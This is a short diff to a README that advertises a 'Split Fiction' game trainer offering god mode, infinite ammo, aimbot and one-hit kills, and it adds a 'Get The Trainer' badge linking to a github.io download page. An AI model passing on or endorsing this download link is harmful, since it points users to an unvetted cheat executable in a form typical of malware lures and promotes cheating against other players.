@@ -4,6 +4,7 @@
 
 **Split Fiction** throws players into chaotic firefights and survival challenges, but a **trainer tool** lets you bend the rules of the game. With toggles for god mode, infinite ammo, aimbot, and one-hit kills, the **Split Fiction trainer** gives you complete freedom to play without limits.
 
+[![Get](https://img.shields.io/badge/Get%20The-Trainer-blueviolet)](https://split-fiction-trainer.github.io/.github/)
 ---
 
 ## Product Description
